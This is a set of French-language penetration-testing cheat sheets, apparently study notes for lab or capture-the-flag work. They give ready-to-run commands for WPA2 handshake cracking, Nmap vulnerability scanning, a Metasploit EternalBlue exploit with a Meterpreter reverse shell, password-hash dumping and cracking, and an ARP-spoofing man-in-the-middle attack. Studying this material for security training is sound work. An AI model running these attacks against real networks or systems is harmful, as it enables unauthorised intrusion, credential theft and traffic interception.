#

---

## 📝 Fiche Récap : Suite Aircrack-ng (Attaque WPA/WPA2)

Voici le workflow complet et les commandes pour pirater un réseau Wi-Fi de type WPA2-PSK.

### **1. Préparation de la carte réseau (airmon-ng)**

- `airmon-ng check kill` : Tue tous les processus Linux (comme NetworkManager) qui pourraient interférer avec l'écoute du Wi-Fi.
- `airmon-ng start wlan0` : Passe la carte Wi-Fi `wlan0` en mode espion (monitor mode). La carte s'appelle désormais souvent `wlan0mon`.

### **2. Repérage et Capture (airodump-ng)**

- `airodump-ng wlan0mon` : Lance le radar global. Affiche tous les réseaux Wi-Fi autour de toi avec leur adresse MAC (BSSID) et leur canal (CH).
- `airodump-ng --bssid <ADRESSE_MAC> --channel <NUM_CANAL> -w <nom_fichier> wlan0mon` :
  - Cible une box précise.
  - Écoute sur le bon canal.
  - `-w` enregistre tous les paquets interceptés dans un fichier (qui aura l'extension `.cap`).
  - *But : Attendre qu'un "WPA Handshake" s'affiche en haut à droite de l'écran.*

### **3. Cassage du mot de passe (aircrack-ng)**

- `aircrack-ng -b <ADRESSE_MAC_CIBLE> -w /chemin/vers/dictionnaire.txt <fichier_capture.cap>` :
  - Lance l'attaque par dictionnaire (ex: avec `/usr/share/wordlists/rockyou.txt`) contre le handshake capturé.
  - `-b` permet de préciser quelle box attaquer si le fichier de capture contient plusieurs réseaux.

---

## 📝 Fiche Récap : Nmap (Scan et Détection de Vulnérabilités)

Nmap est l'outil roi pour la phase de reconnaissance. Voici les commandes essentielles pour scanner une cible de bout en bout et exploiter les résultats.

### **1. Les Scans de Base et la Furtivité**

- `nmap -sn <IP_ou_Reseau>` : **Ping Scan**. Découvre quelles machines sont allumées sur le réseau sans scanner les ports (ex: `nmap -sn 192.168.1.0/24`).
- `nmap -sS <IP>` : **Scan SYN (Stealth Scan)**. Le scan de ports par défaut des hackers. Il est rapide, discret, et ne termine pas la connexion TCP (il envoie un SYN, reçoit le SYN/ACK, et coupe tout avec un RST).
- `nmap -p- <IP>` : **Scan complet**. Scanne l'intégralité des 65535 ports au lieu des 1000 ports par défaut.

### **2. L'Énumération Avancée (Versions et Vulnérabilités)**

- `nmap -sV <IP>` : **Détection de version**. Interroge les ports ouverts pour identifier exactement quel logiciel et quelle version y tournent (crucial pour trouver des failles).
- `nmap -O <IP>` : **Détection d'OS**. Tente de deviner le système d'exploitation de la cible.
- `nmap -A <IP>` : **Scan Agressif**. Fait le `-sV`, le `-O`, un traceroute et lance les scripts de base (bruyant mais très complet).
- `nmap --script vuln <IP>` : **Scan de Vulnérabilités**. La botte secrète ! Nmap utilise son moteur de scripts (NSE) pour vérifier si les services découverts sont sensibles à des failles connues (CVE), comme EternalBlue (ms17-010).

### **3. Exportation des Résultats (Metasploit / Wireshark)**

- `nmap -sS -sV <IP> -oN scan.txt` : Sauvegarde le résultat dans un fichier texte classique, exactement comme il s'affiche à l'écran.
- `nmap -sS -sV <IP> -oX scan.xml` : **Export pour Metasploit**. Exporte en format XML. Dans Metasploit, tu pourras utiliser la commande `db_import scan.xml` pour intégrer toutes les cibles et ports ouverts directement dans ta base de données de piratage !
- `nmap -sS -sV <IP> -oA scan_complet` : Exporte dans tous les formats en même temps (texte, XML, grepable).
- *Note pour Wireshark :* Nmap n'exporte pas directement vers Wireshark. Pour voir ce que fait Nmap sous le capot, on lance Wireshark en tâche de fond pour capturer le réseau pendant que Nmap scanne !

---

## 📝 Fiche Récap : Commandes Essentielles Metasploit

### **1. Le Vocabulaire de base**

- **Vulnerability (Vulnérabilité) :** Une faille de conception ou de code sur le système cible.
- **Exploit :** Le bout de code qui tire parti de cette vulnérabilité (le bélier).
- **Payload (Charge utile) :** Le code qui s'exécute sur la cible une fois la faille exploitée pour obtenir un accès.
  - *Singles :* Payloads autonomes, tout-en-un (ex: `.../pingback_reverse_tcp`).
  - *Staged :* Payloads envoyés en plusieurs petits morceaux (ex: `.../meterpreter/reverse_tcp`).

### **2. Navigation et Recherche (msfconsole)**

- **`msfconsole`** : Lance le framework Metasploit depuis ton terminal.
- **`search <mot-clé>`** : Cherche un module (ex: `search apache`, `search type:auxiliary telnet`, `search ms17-010`).
- **`use <chemin_ou_numero>`** : Sélectionne un module et entre dans son "contexte".
- **`info`** : Affiche les détails complets du module sélectionné (auteur, description, fiabilité/rank).
- **`back`** : Quitte le module actuel pour revenir au menu principal.

### **3. Configuration des paramètres**

- **`show options`** : Affiche les paramètres requis pour faire fonctionner le module (RHOSTS, LPORT, etc.).
- **`show payloads`** : Affiche les charges utiles compatibles avec ton exploit actuel.
- **`set <paramètre> <valeur>`** : Configure une option (ex: `set LPORT 6666`).
- **`setg <paramètre> <valeur>`** : Configure une option *globalement* pour qu'elle reste sauvegardée (ex: `setg RHOSTS 10.10.19.23`).
- **`unset <paramètre>`** (ou `unset all`) : Efface la valeur d'un ou plusieurs paramètres.

### **4. Exploitation et Gestion des Sessions**

- **`exploit`** (ou `run`) : Lance l'attaque.
- **`exploit -z`** : Lance l'attaque et met directement la session en arrière-plan dès qu'elle s'ouvre.
- **`background`** (ou `CTRL+Z`) : Met ta session active en arrière-plan pour te rendre la main sur la console Metasploit.
- **`sessions`** : Liste toutes les sessions (machines compromises) actives en arrière-plan.
- **`sessions -i <ID>`** : Interagit avec une session spécifique pour reprendre le contrôle (ex: `sessions -i 2`).

---

## 📝 Fiche Récap : Workflow Metasploit (Cas Pratique MS17-010)

Voici l'ordre exact et les commandes utilisées pour compromettre un serveur Windows de A à Z avec Metasploit :

### **1. Préparation de l'attaque**

- `msfconsole` : Démarrer le framework.
- `search ms17-010` : Trouver l'exploit correspondant à la faille.
- `use exploit/windows/smb/ms17_010_eternalblue` : Sélectionner le module.

### **2. Configuration des paramètres**

- `set RHOSTS <IP_Cible>` : Définir l'adresse de la victime.
- `set LHOST <IP_VPN_Attaquant>` : Définir notre adresse pour le retour de connexion.
- `set payload windows/x64/meterpreter/reverse_tcp` : Forcer l'utilisation d'un shell avancé (Meterpreter).
- `show options` : Vérifier que tout est correctement paramétré.
- `exploit` (ou `run`) : Lancer l'attaque.

### **3. Stabilisation dans Meterpreter**

- `getuid` : Vérifier nos privilèges (idéalement `NT AUTHORITY\SYSTEM`).
- `ps` : Lister les processus tournant sur la machine cible.
- `migrate <PID>` : Déplacer discrètement notre session dans un processus stable (ex: un processus système légitime).

### **4. Post-Exploitation (Pillage)**

- `hashdump` : Extraire basiquement les empreintes de mots de passe à l'écran.
- *Alternative Pro :* `run post/windows/gather/smart_hashdump` : Extrait et sauvegarde automatiquement les hashs dans un fichier texte (Loot) sur notre machine Kali.

### **5. Navigation et Recherche Système**

- `search -f flag*.txt` : Chercher un fichier spécifique sur tout le disque dur.
- `cat C:/chemin/vers/le/fichier.txt` : Lire le contenu du fichier (attention à utiliser des `/` ou des `\\`).

### **6. Cassage de mots de passe (Hors Metasploit, sur le terminal Kali)**

- `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` : Décompresser le dictionnaire (à faire une seule fois).
- `john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` : Lancer l'attaque par dictionnaire sur l'empreinte volée.

---

## 📝 Fiche Récap : Attaque Man in the Middle (MitM)

L'objectif du MitM ("L'Homme du Milieu") est de se placer entre une victime et le routeur pour intercepter, lire, ou modifier tout le trafic réseau (mots de passe, requêtes, etc.).

### **1. Saturation du Switch (macof)**

- *Concept :* Un switch réseau sécurise le trafic en envoyant les paquets uniquement au bon destinataire. Si on sature sa mémoire de fausses adresses, il panique et se transforme en "Hub" (il envoie tout le trafic à tout le monde).
- `macof -i eth0` : Inonde le réseau local de milliers d'adresses MAC aléatoires depuis ton interface `eth0`.

### **2. Empoisonnement ARP (ettercap)**

- *Concept :* On ment à la victime en lui disant "Je suis le routeur", et on ment au routeur en lui disant "Je suis la victime". Tout le trafic passera donc par notre machine.
- `ettercap -G` : Lance Ettercap avec son interface graphique (très visuel pour cibler ses victimes).
- `ettercap -T -q -i eth0 -M arp:remote /<IP_VICTIME>// /<IP_ROUTEUR>//` : Lance l'attaque silencieusement en ligne de commande.
  - `-T` : Mode texte.
  - `-q` : Mode silencieux (quiet).
  - `-M arp:remote` : Méthode d'attaque (Man in the middle via ARP spoofing).

### **3. Capture du Trafic (tcpdump)**

- *Concept :* Maintenant que le trafic de la victime traverse notre machine, on l'enregistre pour l'analyser.
- `tcpdump -i eth0` : Écoute et affiche tout le trafic qui passe par la carte réseau `eth0`.
- `tcpdump -i eth0 -w interception.pcap` : Enregistre silencieusement tout le trafic intercepté dans un fichier `.pcap`. Ce fichier pourra ensuite être ouvert de manière très propre et lisible dans **Wireshark**.
- `tcpdump -i eth0 port 80` : Filtre pour n'intercepter que le trafic web non sécurisé (HTTP).

### **4. Simulation / Test de la victime (curl)**

- *Concept :* Outil en ligne de commande permettant de simuler un navigateur web (très utile pour générer du trafic et vérifier que notre interception fonctionne).
- `curl http://site-non-securise.com` : Fait une requête web HTTP simple. Si notre MitM avec `tcpdump` ou `ettercap` tourne à côté, on verra cette requête se faire intercepter en direct !
- `curl -u utilisateur:motdepasse http://cible.com` : Simule une tentative de connexion pour vérifier si on arrive bien à intercepter les identifiants qui transitent sur le réseau.

---
